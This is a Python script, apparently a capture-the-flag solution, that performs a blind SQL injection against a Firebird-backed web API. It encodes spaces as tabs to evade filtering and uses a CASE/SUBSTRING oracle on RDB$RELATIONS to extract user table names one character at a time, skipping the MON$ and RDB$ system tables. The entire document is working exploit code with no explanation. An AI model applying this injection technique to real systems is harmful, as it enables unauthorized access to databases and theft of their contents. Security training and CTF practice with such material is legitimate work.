import requests

port = 42583
session = requests.Session()
url = f"http://instances.challenge-ecw.fr:{port}/api/search?id="

to_test = "$RBDMONACEFGHIJKLPsQTUVWXYZ_abcdefghijklmnopqrstuvwxyz"
payload = "(SELECT FIRST 1 SKIP {} CASE SUBSTRING(RDB$RELATION_NAME FROM {} FOR 1) WHEN '{}' THEN 3 ELSE 1 END FROM RDB$RELATIONS)".replace(" ", "%09")

# arg1 -> offset
# arg2 -> pos_char a tester
# arg3 -> char a tester

all_names = []
try:
    for i in range(100):
        print(f"OFFSET {i}")
        pos_char = 1
        name = ""
        j = 0
        while j < len(to_test) and not (name.startswith("MON$") or name.startswith("RDB$")):
            # MON$ and RDB$ are tables created by system
            payload_fait = payload.format(str(i), str(pos_char), to_test[j])
            complete_url = f"{url}{payload_fait}"
            print(f"Getting : {complete_url}")
            req = session.get(complete_url)
            print(req.text)
            if req.text.startswith('{"status":"ok","id":3,'):
                print(f"Found letter : {to_test[j]}")
                name += to_test[j]
                j = 0
                pos_char += 1

            else:
                j += 1
        print(name)
        all_names.append(name)
except KeyboardInterrupt:
    pass

print(all_names)